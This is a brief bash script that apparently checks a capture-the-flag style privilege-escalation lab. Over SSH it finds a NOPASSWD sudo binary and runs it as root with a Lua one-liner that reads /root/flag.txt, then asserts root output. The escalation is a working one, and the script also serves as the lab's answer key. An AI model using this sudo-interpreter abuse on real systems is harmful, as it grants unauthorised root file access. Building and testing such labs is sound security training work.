#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'BIN=$(sudo -l 2>/dev/null | awk "/NOPASSWD/ {print \$NF; exit}"); sudo -n "$BIN" -e "print(io.open(\"/root/flag.txt\"):read(\"*a\"))"')"
assert_root_output "${out}"
